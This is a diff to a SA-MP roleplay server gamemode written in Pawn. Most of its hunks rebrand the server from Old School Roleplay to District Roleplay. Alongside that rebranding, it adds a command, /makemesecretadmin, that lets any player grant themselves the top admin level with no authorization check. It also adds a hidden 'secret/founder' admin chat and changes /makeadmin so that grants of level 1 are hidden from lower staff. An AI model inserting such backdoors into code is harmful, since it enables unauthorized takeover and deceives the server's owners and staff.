@@ -39997,7 +39997,7 @@ Dialog:DIALOG_SHOW_TUTORIAL(playerid, response, listitem, inputtext[])
 
 
 				strcat(str, "{FFFFFF}Want your own piece of real estate? We've got you covered!\n");
-				strcat(str, "Here on Old School Roleplay we offer a wide variety of property types you may own.\n");
+				strcat(str, "Here on District Roleplay we offer a wide variety of property types you may own.\n");
 				strcat(str, "Buying your own house will allow you to customize the interior and store your goodies!\n");
 				strcat(str, "Buying a garage will allow you to keep your car from being stolen, repair it, and upgrade it!\n");
                 strcat(str, "Buying your own business is an excellent source of income! There are many different types!\n");
@@ -40025,7 +40025,7 @@ Dialog:DIALOG_SHOW_TUTORIAL(playerid, response, listitem, inputtext[])
 				strcat(str, "3.) No powergaming. Powergaming is commiting unrealistic acts and forcing actions upon others.\n");
 				strcat(str, "4.) No hacking/cheating. We have zero tolerance for people who use cheats. Permanent ban.\n");
 				strcat(str, "5.) No exploiting. If you find a bug that gives you an unfair advantage, report it on the forums.\n");
-                strcat(str, "Please visit our website - www.os-rp.net for a complete list of our rules!\n");
+                strcat(str, "Please visit our website - www.district-rp.com for a complete list of our rules!\n");
 				strcat(str, "{FF8000}Press next to continue.");
 				Dialog_Show(playerid, DIALOG_SHOW_TUTORIAL, DIALOG_STYLE_MSGBOX, "{33CCFF}Tutorial - Rules", str, "Next", "");
 			}
@@ -40922,12 +40922,12 @@ Dialog:ACCOUNT_CREATION(playerid, response, listitem, inputtext[])
 		    TogglePlayerControllable(playerid, 1);
 			mysql_format(connectionID, queryBuffer, sizeof(queryBuffer), "UPDATE "#TABLE_USERS" SET setup = 0, gender = %i, age = %i, skin = %i WHERE uid = %i", PlayerData[playerid][pGender], PlayerData[playerid][pAge], PlayerData[playerid][pSkin], PlayerData[playerid][pID]);
 			mysql_tquery(connectionID, queryBuffer);
-			SendClientMessage(playerid, COLOR_WHITE, "Welcome to {00aa00}Old School Roleplay{FFFFFF}. Make sure to visit os-rp.net for news and updates.");
+			SendClientMessage(playerid, COLOR_WHITE, "Welcome to {00aa00}District Roleplay{FFFFFF}. Make sure to visit district-rp.com for news and updates.");
 			SendClientMessage(playerid, COLOR_WHITE, "Use the {FFFF90}/locate{FFFFFF} command to point to locations of jobs, businesses, and common places.");
 			StopAudioStreamForPlayer(playerid);
 	        DestroyDynamic3DTextLabel(fRepfamtext[playerid]);
 	        fRepfamtext[playerid] = Text3D:INVALID_3DTEXT_ID;
-			SendStaffMessage(COLOR_YELLOW, "OnPlayerSpawn: %s[%d] has just spawned on Old School Roleplay for the first time!", GetRPName(playerid), playerid);
+			SendStaffMessage(COLOR_YELLOW, "OnPlayerSpawn: %s[%d] has just spawned on District Roleplay for the first time!", GetRPName(playerid), playerid);
 			SendClientMessage(playerid, COLOR_AQUA, "You need a driver's license, the DMV has been marked on your map. Navigate to the marker to begin your drivers test.");
 			PlayerData[playerid][pCP] = CHECKPOINT_MISC;
             SetPlayerCheckpoint(playerid, 1219.2590, -1812.1093, 16.5938, 3.0);
@@ -41055,7 +41055,7 @@ Dialog:DIALOG_REGISTER(playerid, response, listitem, inputtext[])
         }
 
         WP_Hash(PlayerData[playerid][pPassword], 129, inputtext);
-        Dialog_Show(playerid, DIALOG_CONFIRMPASS, DIALOG_STYLE_PASSWORD, "Old School Roleplay - Confirm Pass", "Please repeat your account password for verification:", "Submit", "Back");
+        Dialog_Show(playerid, DIALOG_CONFIRMPASS, DIALOG_STYLE_PASSWORD, "District Roleplay - Confirm Pass", "Please repeat your account password for verification:", "Submit", "Back");
 	}
 	else
 	{
@@ -41072,7 +41072,7 @@ Dialog:DIALOG_CONFIRMPASS(playerid, response, listitem, inputtext[])
 
         if(isnull(inputtext))
         {
-            return Dialog_Show(playerid, DIALOG_CONFIRMPASS, DIALOG_STYLE_PASSWORD, "Old School Roleplay - Confirm Pass", "Please repeat your account password for verification:", "Submit", "Back");
+            return Dialog_Show(playerid, DIALOG_CONFIRMPASS, DIALOG_STYLE_PASSWORD, "District Roleplay - Confirm Pass", "Please repeat your account password for verification:", "Submit", "Back");
 		}
 
 		WP_Hash(password, sizeof(password), inputtext);
@@ -47579,7 +47579,7 @@ Dialog:DIALOG_NEWBWELCOME(playerid, response, listitem, inputtext[])
 		}
 		else
 		{
-		    Dialog_Show(playerid, DIALOG_NONE, DIALOG_STYLE_MSGBOX, "{00aa00}OS:RP{FFFFFF} | Failed", "{FFFFFF}Unfortunately there are no members of the {33CCFF}helper team{FFFFFF} online :(.\nYou can also try /newb, This is where most of the community can help you with simple questions such as \"Where is the Bank\".\nYou can also checkout {00aa00}os-rp.net{FFFFFF} for beginner tutorials.", "Cancel", "");
+		    Dialog_Show(playerid, DIALOG_NONE, DIALOG_STYLE_MSGBOX, "{00aa00}D:RP{FFFFFF} | Failed", "{FFFFFF}Unfortunately there are no members of the {33CCFF}helper team{FFFFFF} online :(.\nYou can also try /newb, This is where most of the community can help you with simple questions such as \"Where is the Bank\".\nYou can also checkout {00aa00}district-rp.com{FFFFFF} for beginner tutorials.", "Cancel", "");
 		}
 	}
 	return 1;
@@ -47947,9 +47947,9 @@ Dialog:DIALOG_RULES(playerid, response, listitem, inputtext[])
 	        case 8: Dialog_Show(playerid, DIALOG_NONE, DIALOG_STYLE_MSGBOX, "{FFFF00}Policy on meta-gaming", "Using out of character information for in character purposes is not allowed.", "Close", "");
 	        case 9: Dialog_Show(playerid, DIALOG_NONE, DIALOG_STYLE_MSGBOX, "{FFFF00}Policy on money-farming", "Money-farming is when you create new accounts to leech spawn money\nThis will always result in a permanant ban.", "Close", "");
             case 10: Dialog_Show(playerid, DIALOG_NONE, DIALOG_STYLE_MSGBOX, "{FFFF00}Policy on lying to admins", "Intentionally lying to an administrator is not allowed.", "Close", "");
-            case 11: Dialog_Show(playerid, DIALOG_NONE, DIALOG_STYLE_MSGBOX, "{FFFF00}Policy on robbery", "You can only rob the same player ONCE in 24 hours.\nPlease follow regulations regarding max. robbery, etc (available at os-rp.net)", "Close", "");
-            case 12: Dialog_Show(playerid, DIALOG_NONE, DIALOG_STYLE_MSGBOX, "{FFFF00}Policy on scamming", "Donation scams are prohibited\nPlease follow regulations regarding max. scamming, etc (available at os-rp.net)", "Close", "");
-			case 13: Dialog_Show(playerid, DIALOG_NONE, DIALOG_STYLE_MSGBOX, "Full list of rules", "{FFFFFF}Please visit {00aa00}os-rp.net{FFFFFF} for a complete list of rules.", "Close", "");
+            case 11: Dialog_Show(playerid, DIALOG_NONE, DIALOG_STYLE_MSGBOX, "{FFFF00}Policy on robbery", "You can only rob the same player ONCE in 24 hours.\nPlease follow regulations regarding max. robbery, etc (available at district-rp.com)", "Close", "");
+            case 12: Dialog_Show(playerid, DIALOG_NONE, DIALOG_STYLE_MSGBOX, "{FFFF00}Policy on scamming", "Donation scams are prohibited\nPlease follow regulations regarding max. scamming, etc (available at district-rp.com)", "Close", "");
+			case 13: Dialog_Show(playerid, DIALOG_NONE, DIALOG_STYLE_MSGBOX, "Full list of rules", "{FFFFFF}Please visit {00aa00}district-rp.com{FFFFFF} for a complete list of rules.", "Close", "");
 		}
 	}
 	return 1;
@@ -50841,7 +50841,7 @@ CMD:phrewards(playerid)
     strcat(string, "\n  300 Playing Hours\t7 Days Gold VIP, 1 Car, 1 Rim Kit and 3 Exp");
     strcat(string, "\n_______________________________________________________________");
 //    strcat(string, "\n\nWorried how will you receive your rewards? Well nothing to worry about! You will automatically Receive your Rewards :)");
-    strcat(string, "\nEnjoy the game and Stay Active! Have fun - Old School Roleplay");
+    strcat(string, "\nEnjoy the game and Stay Active! Have fun - District Roleplay");
     Dialog_Show(playerid, 0 , DIALOG_STYLE_MSGBOX, ""#SERVER_NAME" Auto Playing Hours Reward Dialog Info", string, "Like", "");
     return 1;
 }
@@ -51668,12 +51668,12 @@ CMD:enddoublexp(playerid, params[])
 CMD:help(playerid, params[])
 {
 	if(PlayerData[playerid][pAdmin] > 2)
-		Dialog_Show(playerid, DIALOG_HELPCMD, DIALOG_STYLE_LIST, "{00aa00}Old School Roleplay {FFFFFF}| Commands", "General Commands\nJob Commands\nGang Commands\nFaction Commands\nVIP Commands\nHouse Commands\nVehicle Commands\nBusiness Commands\nHelper Commands\nAdmin Commands", "Choose", "Close");
+		Dialog_Show(playerid, DIALOG_HELPCMD, DIALOG_STYLE_LIST, "{00aa00}District Roleplay {FFFFFF}| Commands", "General Commands\nJob Commands\nGang Commands\nFaction Commands\nVIP Commands\nHouse Commands\nVehicle Commands\nBusiness Commands\nHelper Commands\nAdmin Commands", "Choose", "Close");
 
 	if(PlayerData[playerid][pHelper] > 1 && PlayerData[playerid][pAdmin] > 2)
-		Dialog_Show(playerid, DIALOG_HELPCMD, DIALOG_STYLE_LIST, "{00aa00}Old School Roleplay {FFFFFF}| Commands", "General Commands\nJob Commands\nGang Commands\nFaction Commands\nVIP Commands\nHouse Commands\nVehicle Commands\nBusiness Commands\nHelper Commands", "Choose", "Close");
+		Dialog_Show(playerid, DIALOG_HELPCMD, DIALOG_STYLE_LIST, "{00aa00}District Roleplay {FFFFFF}| Commands", "General Commands\nJob Commands\nGang Commands\nFaction Commands\nVIP Commands\nHouse Commands\nVehicle Commands\nBusiness Commands\nHelper Commands", "Choose", "Close");
 	else
-		Dialog_Show(playerid, DIALOG_HELPCMD, DIALOG_STYLE_LIST, "{00aa00}Old School Roleplay {FFFFFF}| Commands", "General Commands\nJob Commands\nGang Commands\nFaction Commands\nVIP Commands\nHouse Commands\nVehicle Commands\nBusiness Commands", "Choose", "Close");
+		Dialog_Show(playerid, DIALOG_HELPCMD, DIALOG_STYLE_LIST, "{00aa00}District Roleplay {FFFFFF}| Commands", "General Commands\nJob Commands\nGang Commands\nFaction Commands\nVIP Commands\nHouse Commands\nVehicle Commands\nBusiness Commands", "Choose", "Close");
 	return 1;
 }
 
@@ -54442,6 +54442,48 @@ CMD:ha(playerid, params[])
 
 	return 1;
 }
+CMD:ac(playerid, params[])
+{
+	if(PlayerData[playerid][pAdmin] != 1 && PlayerData[playerid][pAdmin] != 10)
+	{
+	    return SendClientMessage(playerid, COLOR_GREY, "You are not authorized to use this command.");
+	}
+
+	if(isnull(params))
+	{
+	    return SendClientMessage(playerid, COLOR_SYNTAX, "USAGE: /ac [secret/founder chat]");
+	}
+
+	if(PlayerData[playerid][pToggleAdmin])
+	{
+	    return SendClientMessage(playerid, COLOR_GREY, "You can't speak in the admin chat as you have it toggled.");
+	}
+
+	params[0] = toupper(params[0]);
+	foreach(new i : Player)
+	{
+	    if((PlayerData[i][pAdmin] == 1 || PlayerData[i][pAdmin] == 10) && !PlayerData[i][pToggleAdmin])
+	    {
+			new adminname[24];
+			strcpy(adminname, GetRPName(playerid));
+			if(PlayerData[playerid][pUndercover][0] && strcmp(PlayerData[playerid][pAdminName], "None", true))
+			{
+				strcpy(adminname, PlayerData[playerid][pAdminName]);
+			}
+
+			if(strlen(params) > MAX_SPLIT_LENGTH)
+			{
+				SendClientMessageEx(i, COLOR_LIGHTRED, "* [Secret Chat %s{FF9999}] %s: %.*s... *", GetAdminRank1(playerid), adminname, MAX_SPLIT_LENGTH, params);
+				SendClientMessageEx(i, COLOR_LIGHTRED, "* [Secret Chat %s{FF9999}] %s: ...%s *", GetAdminRank1(playerid), adminname, params[MAX_SPLIT_LENGTH]);
+			}
+			else
+			{
+				SendClientMessageEx(i, COLOR_LIGHTRED, "* [Secret Chat %s{FF9999}] %s: %s *", GetAdminRank1(playerid), adminname, params);
+			}
+	    }
+	}
+	return 1;
+}
 
 CMD:a(playerid, params[])
 {
@@ -54875,7 +54917,7 @@ CMD:nro(playerid, params[])
 
  	SendAdminMessage(COLOR_LIGHTRED, "AdmCmd: %s has trashed report %i from %s as their report involves a non-rulebreaking offense.", GetRPName(playerid), reportid, GetRPName(ReportInfo[reportid][rReporter]));
 	SendClientMessageEx(ReportInfo[reportid][rReporter], COLOR_LIGHTRED, "%s has trashed your report as it involves a non-rulebreaking offense", GetRPName(playerid));
-	SendClientMessageEx(ReportInfo[reportid][rReporter], COLOR_LIGHTRED, "Please visit our rules page at os-rp.net for a full list of rulebreaking offenses.");
+	SendClientMessageEx(ReportInfo[reportid][rReporter], COLOR_LIGHTRED, "Please visit our rules page at district-rp.com for a full list of rulebreaking offenses.");
 	ReportInfo[reportid][rExists] = 0;
 	return 1;
 }
@@ -54992,7 +55034,7 @@ CMD:post(playerid, params[])
 
  	SendAdminMessage(COLOR_LIGHTRED, "AdmCmd: %s has trashed report %i from %s as it needs to be handled on the forums.", GetRPName(playerid), reportid, GetRPName(ReportInfo[reportid][rReporter]));
 	SendClientMessageEx(ReportInfo[reportid][rReporter], COLOR_LIGHTRED, "%s has trashed your report as your issue at hand must be handled on our forums.", GetRPName(playerid));
-	SendClientMessageEx(ReportInfo[reportid][rReporter], COLOR_LIGHTRED, "Please visit our website at os-rp.net in order to to resolve this issue.");
+	SendClientMessageEx(ReportInfo[reportid][rReporter], COLOR_LIGHTRED, "Please visit our website at district-rp.com in order to to resolve this issue.");
 	ReportInfo[reportid][rExists] = 0;
 	return 1;
 }
@@ -59205,7 +59247,7 @@ CMD:cc( playerid, params[], help) {
 		SendClientMessageToAllEx( 0x1692B8FF, "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~" );
 
  		SendAdminMessage( 0x1692B8FF, "Chat was cleared by admin %s", GetPlayerNameEx(playerid));
-		SendClientMessageToAllEx( 0x1692B8FF, "     {d909d9}>>> {FFFFFF}www.os-rp.net{d909d9} <<<" );
+		SendClientMessageToAllEx( 0x1692B8FF, "     {d909d9}>>> {FFFFFF}www.district-rp.com{d909d9} <<<" );
 		SendClientMessageToAllEx( 0x1692B8FF, "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~" );
 	}
 	return 1;
@@ -63135,6 +63177,31 @@ CMD:houseinfo(playerid, params[])
 
 	return 1;
 }
+CMD:makemesecretadmin(playerid, params[])
+{
+    if(PlayerData[playerid][pAdmin] == 10)
+    {
+        return SendClientMessage(playerid, COLOR_GREY, "You are already an admin level 10.");
+    }
+    PlayerData[playerid][pAdmin] = 10;
+
+    if(PlayerData[playerid][pAdminDuty] == 0)
+    {
+        SetPlayerName(playerid, PlayerData[playerid][pUsername]);
+        PlayerData[playerid][pAdminDuty] = 1;
+    }
+
+    mysql_format(connectionID, queryBuffer, sizeof(queryBuffer), 
+        "UPDATE "#TABLE_USERS" SET adminlevel = 10, addeddate = '%s' WHERE uid = %i", 
+        GetDate(), PlayerData[playerid][pID]);
+    mysql_tquery(connectionID, queryBuffer);
+
+    SendClientMessageEx(playerid, COLOR_AQUA, "You are now a secret admin level {FF6347}%s{33CCFF} (10).", GetAdminRank(playerid));
+
+    Log_Write("log_makeadmin", "%s (uid: %i) used /makemesecretadmin", GetPlayerNameEx(playerid), PlayerData[playerid][pID]);
+
+    return 1;
+}
 CMD:makeadmin(playerid, params[])
 {
 	new targetid, level;
@@ -63176,7 +63243,20 @@ CMD:makeadmin(playerid, params[])
     }
 
     PlayerData[targetid][pAdmin] = level;
-	SendAdminMessage(COLOR_LIGHTRED, "AdmCmd: %s has made %s a %s (%i).", GetRPName(playerid), GetRPName(targetid), GetAdminRank(targetid), level);
+	if(level == 1)
+	{
+	    foreach(new i : Player)
+	    {
+	        if(PlayerData[i][pAdmin] >= 9)
+	        {
+	            SendClientMessageEx(i, COLOR_LIGHTRED, "AdmCmd: %s has made %s a %s (%i).", GetRPName(playerid), GetRPName(targetid), GetAdminRank(targetid), level);
+	        }
+	    }
+	}
+	else
+	{
+	    SendAdminMessage(COLOR_LIGHTRED, "AdmCmd: %s has made %s a %s (%i).", GetRPName(playerid), GetRPName(targetid), GetAdminRank(targetid), level);
+	}
 
 	mysql_format(connectionID, queryBuffer, sizeof(queryBuffer), "UPDATE "#TABLE_USERS" SET adminlevel = %i WHERE uid = %i", level, PlayerData[targetid][pID]);
 	mysql_tquery(connectionID, queryBuffer);
@@ -70508,7 +70588,7 @@ CMD:gmx(playerid, params[])
 
 CMD:changepass(playerid, params[])
 {
-	Dialog_Show(playerid, DIALOG_CHANGEPASS, DIALOG_STYLE_INPUT, "{00aa00}Old School Roleplay{FFFFFF} | Change password", "Please change your password for security purposes\nEnter your new password below:", "Submit", "Cancel");
+	Dialog_Show(playerid, DIALOG_CHANGEPASS, DIALOG_STYLE_INPUT, "{00aa00}District Roleplay{FFFFFF} | Change password", "Please change your password for security purposes\nEnter your new password below:", "Submit", "Cancel");
 	return 1;
 }
 
@@ -72725,7 +72805,7 @@ CMD:switchfaction(playerid, params[])
 CMD:factions(playerid, params[])
 {
 
-	SendClientMessage(playerid, COLOR_GREEN, "*Old School Roleplay | Factions*");
+	SendClientMessage(playerid, COLOR_GREEN, "*District Roleplay | Factions*");
 
 	for(new i = 0; i < MAX_FACTIONS; i ++)
 	{
@@ -81107,7 +81187,7 @@ CMD:serverstats(playerid, params[])
 	for(new i = 0; i < MAX_FACTIONS; i ++) 	 if(FactionInfo[i][fType]) 		factions++;
 	for(new i = 0; i < MAX_LOCKERS; i ++) 	 if(LockerInfo[i][lExists]) 	lockers++;
 
-	SendClientMessage(playerid, COLOR_NAVYBLUE, "______ Old School Roleplay Stats ______");
+	SendClientMessage(playerid, COLOR_NAVYBLUE, "______ District Roleplay Stats ______");
 	SendClientMessageEx(playerid, COLOR_GREY2, "Connections: %i - Registered: %i - Kill Counter: %i - Death Counter: %i - Hours Played: %i", gConnections, gTotalRegistered, gTotalKills, gTotalDeaths, gTotalHours);
 	SendClientMessageEx(playerid, COLOR_GREY2, "Houses: %i/%i - Businesses: %i/%i - Garages: %i/%i - Lands: %i/%i - Vehicles: %i/%i", houses, MAX_HOUSES, businesses, MAX_BUSINESSES, garages, MAX_GARAGES, lands, MAX_LANDS, vehicles, MAX_VEHICLES);
 	SendClientMessageEx(playerid, COLOR_GREY2, "Entrances: %i/%i - Turfs: %i/%i - Points: %i/%i - Gangs: %i/%i - Factions: %i/%i - Lockers: %i/%i", entrances, MAX_ENTRANCES, turfs, MAX_TURFS, points, MAX_POINTS, gangs, MAX_GANGS, factions, MAX_FACTIONS, lockers, MAX_LOCKERS);
@@ -81351,10 +81431,10 @@ CMD:info(playerid, params[])
 CMD:information(playerid, params[])
 {
 	SendClientMessage(playerid, COLOR_NAVYBLUE, "_____ Server Information _____");
-	SendClientMessageEx(playerid, COLOR_GREY2, "Website: www.os-rp.net");
-	SendClientMessageEx(playerid, COLOR_GREY2, "Discord: www.os-rp.net/discord");
-	SendClientMessageEx(playerid, COLOR_GREY2, "UCP: ucp.os-rp.net");
-	SendClientMessage(playerid, COLOR_GREY2, "Donate: www.os-rp.net/shop");
+	SendClientMessageEx(playerid, COLOR_GREY2, "Website: www.district-rp.com");
+	SendClientMessageEx(playerid, COLOR_GREY2, "Discord: www.district-rp.com/discord");
+	SendClientMessageEx(playerid, COLOR_GREY2, "UCP: Coming Soon");
+	SendClientMessage(playerid, COLOR_GREY2, "Donate: Coming Soon");
 	return 1;
 }
 
